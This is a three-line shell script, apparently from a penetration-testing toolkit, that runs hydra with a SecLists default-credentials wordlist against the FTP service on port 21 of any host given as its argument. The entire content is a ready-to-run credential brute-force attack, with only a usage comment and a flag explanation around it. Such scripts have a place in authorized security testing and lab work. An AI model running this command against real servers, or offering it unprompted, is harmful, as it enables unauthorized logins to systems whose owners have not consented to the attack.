# example: ./ftp-bruteforce.sh hostname
# -I: ignore an existing restore file (don't wait 10 seconds)
hydra -C ../lists/seclists/SecLists-master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$1 -s 21 -I
